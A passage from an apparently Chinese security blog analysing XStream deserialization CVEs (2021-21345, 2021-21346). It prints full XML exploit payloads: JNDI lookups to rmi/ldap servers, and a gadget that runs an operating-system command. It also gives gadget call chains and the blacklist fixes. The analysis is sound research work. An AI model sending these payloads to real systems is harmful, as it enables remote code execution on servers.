class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.rowset.JdbcRowSetImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">concurrency</span>&gt;</span>1008<span class="tag">&lt;/<span class="name">concurrency</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">escapeProcessing</span>&gt;</span>true<span class="tag">&lt;/<span class="name">escapeProcessing</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchDir</span>&gt;</span>1000<span class="tag">&lt;/<span class="name">fetchDir</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>从POC中可以看出</p><ol><li>最终的RCE触发点是JdbcRowSetImpl jndi类型注入漏洞</li><li>出发点是PriorityQueue自动调用compare方法</li></ol><p>PriorityQueue这个也是cc链中被用到的，PriorityQueue实现了Serializable，且重写了readObject。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>heapify 是个排序操作，调用了每个key的compare方法</p><p>具体的调用链如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">java.util.PriorityQueue#heapify</span><br><span class="line">  sun.awt.datatransfer.DataTransferer$IndexOrderComparator#compare</span><br><span class="line">    com.sun.xml.internal.ws.client.ResponseContext#get</span><br><span class="line">      com.sun.xml.internal.ws.api.message.MessageWrapper#getAttachments</span><br><span class="line">        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getAttachments</span><br><span class="line">          com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getMessage</span><br><span class="line">            com.sun.xml.internal.ws.message.JAXBAttachment#getInputStream</span><br><span class="line">              com.sun.xml.internal.ws.message.JAXBAttachment#asInputStream</span><br><span class="line">                com.sun.xml.internal.ws.message.JAXBAttachment#writeTo</span><br><span class="line">                  com.sun.xml.internal.ws.db.glassfish.BridgeWrapper#marshal</span><br><span class="line">                    com.sun.xml.internal.bind.api.Bridge#marshal</span><br><span class="line">                      com.sun.xml.internal.bind.v2.runtime.BridgeImpl#marshal</span><br><span class="line">                        com.sun.xml.internal.bind.v2.runtime.MarshallerImpl#write</span><br><span class="line">                          com.sun.xml.internal.bind.v2.runtime.XMLSerializer#childAsXsiType</span><br><span class="line">                            com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl#serializeURIs</span><br><span class="line">                              com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</span><br><span class="line">                                com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</span><br><span class="line">                                  com.sun.rowset.JdbcRowSetImpl#connect</span><br></pre></td></tr></table></figure><p>个人认为这个关键利用点是com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Method getter;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> ValueT <span class="title">get</span><span class="params">(BeanT bean)</span> <span class="keyword">throws</span> AccessorException </span>&#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// 此处可以任意执行</span></span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">this</span>.getter.invoke(bean);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IllegalAccessException var3) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalAccessError(var3.getMessage());</span><br><span class="line">           &#125; <span class="keyword">catch</span> (InvocationTargetException var4) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">this</span>.handleInvocationTargetException(var4);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>在Java原生反序列化中，这里非Serializable并没有问题，但是XStream不受限制所有类都可以实例化，导致了中间可以有很多节点可以用来作为构造链的节点。</p><h3 id="黑名单：-1"><a href="#黑名单：-1" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE-2021-21345"></a>CVE-2021-21345</h2><p>author：钟师傅</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=<span class="string">&#x27;custom&#x27;</span>&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;<span class="keyword">default</span>&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br><span class="line">        &lt;indexMap <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br><span class="line">              &lt;dataSource <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br><span class="line">                &lt;bridge <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br><span class="line">                  &lt;bridge <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br><span class="line">                    &lt;bi <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br><span class="line">                      &lt;jaxbType&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/jaxbType&gt;</span><br><span class="line">                      &lt;uriProperties/&gt;</span><br><span class="line">                      &lt;attributeProperties/&gt;</span><br><span class="line">                      &lt;inheritedAttWildcard <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br><span class="line">                        &lt;getter&gt;</span><br><span class="line">                          &lt;<span class="class"><span class="keyword">class</span>&gt;<span class="title">com</span>.<span class="title">sun</span>.<span class="title">corba</span>.<span class="title">se</span>.<span class="title">impl</span>.<span class="title">activation</span>.<span class="title">ServerTableEntry</span>&lt;/<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">                          &lt;<span class="title">name</span>&gt;<span class="title">verify</span>&lt;/<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">                          &lt;<span class="title">parameter</span>-<span class="title">types</span>/&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">getter</span>&gt;</span></span><br><span class="line"><span class="class">                      &lt;/<span class="title">inheritedAttWildcard</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">bi</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">tagName</span>/&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">context</span>&gt;</span></span><br><span class="line"><span class="class">                      &lt;<span class="title">marshallerPool</span> <span class="title">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br><span class="line">                        &lt;outer-<span class="class"><span class="keyword">class</span> <span class="title">reference</span></span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span><br><span class="line">                      &lt;/marshallerPool&gt;</span><br><span class="line">                      &lt;nameList&gt;</span><br><span class="line">                        &lt;nsUriCannotBeDefaulted&gt;</span><br><span class="line">                          &lt;boolean&gt;true&lt;/boolean&gt;</span><br><span class="line">                        &lt;/nsUriCannotBeDefaulted&gt;</span><br><span class="line">                        &lt;namespaceURIs&gt;</span><br><span class="line">                          &lt;string&gt;1&lt;/string&gt;</span><br><span class="line">                        &lt;/namespaceURIs&gt;</span><br><span class="line">                        &lt;localNames&gt;</span><br><span class="line">                          &lt;string&gt;UTF-8&lt;/string&gt;</span><br><span class="line">                        &lt;/localNames&gt;</span><br><span class="line">                      &lt;/nameList&gt;</span><br><span class="line">                    &lt;/context&gt;</span><br><span class="line">                  &lt;/bridge&gt;</span><br><span class="line">                &lt;/bridge&gt;</span><br><span class="line">                &lt;jaxbObject <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span><br><span class="line">                  &lt;activationCmd&gt;open /Applications/Calculator.app&lt;/activationCmd&gt;</span><br><span class="line">                &lt;/jaxbObject&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>长得很像，出发点是一样的PriorityQueue，RCE触发点是com.sun.corba.se.impl.activation.ServerTableEntry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> String activationCmd;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">verify</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (debug)</span><br><span class="line">               System.out.println(<span class="string">&quot;Server being verified w/&quot;</span> + activationCmd);</span><br><span class="line"></span><br><span class="line">           process = Runtime.getRuntime().exec(activationCmd);</span><br><span class="line">           <span class="keyword">int</span> result = process.waitFor();</span><br><span class="line">           ...</span><br><span class="line">           </span><br><span class="line">   <span class="comment">//synchronized 是同步锁</span></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">activate</span><span class="params">()</span> <span class="keyword">throws</span> org.omg.CORBA.SystemException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       state = ACTIVATED;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (debug)</span><br><span class="line">               printDebug(<span class="string">&quot;activate&quot;</span>, <span class="string">&quot;activating server&quot;</span>);</span><br><span class="line">           process = Runtime.getRuntime().exec(activationCmd);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">       ..</span><br></pre></td></tr></table></figure><h3 id="黑名单：-2"><a href="#黑名单：-2" class="headerlink" title="黑名单："></a>黑名单：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.sun.corba.se.impl.activation.ServerTableEntry</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h2><p>author: wh1t3p1g</p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">defaultLocale</span>&gt;</span>zh_CN<span class="tag">&lt;/<span class="name">defaultLocale</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">tables</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>lazyValue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">className</span>&gt;</span>javax.naming.InitialContext<span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>doLookup<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>ldap://localhost:1099/CallRemoteMethod<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span 